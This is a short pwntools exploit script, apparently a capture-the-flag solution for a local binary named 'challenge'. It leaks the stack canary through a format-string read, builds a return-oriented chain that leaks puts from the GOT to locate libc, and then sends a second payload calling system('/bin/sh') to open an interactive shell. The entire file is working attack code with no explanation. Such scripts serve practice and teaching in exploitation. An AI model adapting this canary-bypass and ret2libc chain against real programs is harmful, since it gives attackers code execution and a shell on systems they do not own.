from pwn import *
p = process("./challenge")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

p.sendline("%13$lx")
canary = p.recvline()

payload = "A"*56
payload += p64(int(canary, 16)) #canary
payload += p64(0x0) #junk
payload += p64(0x4008d3) # pop rdi

payload += p64(0x601020) # got
payload += p64(0x400600) # plt
payload += p64(0x400776) # wh4tt

p.sendline(payload)
leak = u64(p.recvline().strip().ljust(8, "\x00")) #puts leak
log.info("Leak: %x" % leak)

libc_base = leak - libc.symbols['puts']

payload = "A"*56
payload += p64(int(canary, 16)) #canary
payload += p64(0x0) #junk
payload += p64(0x4008d3) # pop rdi

payload += p64(0x7ffff7b99d57) # /bin/sh
payload += p64(0x7ffff7a52390) # system

p.sendline("%13$lx")
p.sendline(payload)

p.interactive()
